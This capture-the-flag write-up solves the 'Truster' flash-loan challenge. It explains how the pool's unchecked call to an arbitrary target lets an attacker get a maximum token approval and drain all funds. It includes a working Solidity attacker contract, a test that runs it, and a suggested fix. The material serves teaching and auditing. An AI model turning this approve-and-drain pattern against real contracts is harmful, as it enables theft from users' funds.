# Truster

## Challenge

More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

Currently the pool has 1 million DVT tokens in balance. And you have nothing.

But don't worry, you might be able to take them all from the pool. In a single transaction.

## Solution

Let us observe the flashloan function inside `TrusterLenderPool.sol`

```solidity
function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

This function takes the amount to borrow, the address of the borrower contract, the address of the target contract the flashloan should interact with and the data to send to that target contarct. We see that the only way the execution of this function does not fail is that the borrower pays back the loan.

The only place to exploit this contract is then using the call to the `target` contract. In this case `functionCall` is a method implemented for addresses of the type `Address` which is a safer type implementes by OpenZeppelin. It implements the low level `call` method, so the data we should pass to it must include a call to a function implemented in `target`.

If we think for a moment, `target` can be any contract we want, and the call of the function within `target` will be signed by the `TrustLenderPool.sol` contract. This means that this contract is blindly signing any possible transaction. Let use this to steal all its funds. Recall that `IERC20` tokens have several ways of transfering. One of them is by the `approve` - `transferFrom` sequence. That is, the sender first approve a certain amount of tokens for the receiver to take, and then the receiver uses `transferFrom` to claim them. Then we only need `TrustLenderPool.sol` to sign an approval for a big amount and we can just take it. We create an attacker contract, that we call [`AttackerTruster.sol`](./AttackerTruster.sol). The main function looks like this

```solidity
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature('approve(address,uint256)', address(this), 2**256 - 1);
        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
```

First we create an instance of both the pool and the DVT token to their respective addresses. Then we prepare the data to call the `approve` function for the maximum value of a `uint256` variable. We call `flashLoan` with the corresponding target to be the DVT token address and the data we defined before. Here we could create a contract that just pays back the borrowed amount, but since the borrowed amount is allowed to be 0 we just simplify it by asking 0, and then we do not need to payback anything. Once this function is executed, `TrustLenderPool.sol` has given us the approval to take all its tokens, and that is what we do in the last line.

To run the attack we complete the code in [truster.challenge.js](../../test/truster/truster.challenge.js) by adding

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE  */
  const Attacker = await ethers.getContractFactory("AttackerTruster", attacker)
  attackerContract = await Attacker.deploy()
  await attackerContract.attack(this.pool.address, this.token.address)
})
```

## Solving the issue

We have seen that the issue here was blindly signing transactions. To solve the issue we should just remove the `target` and `data` parameters. As an issuer of flashloans we do not care who is the contract using the borrowed funds, so this logic should be implemented iin the borrower contract.
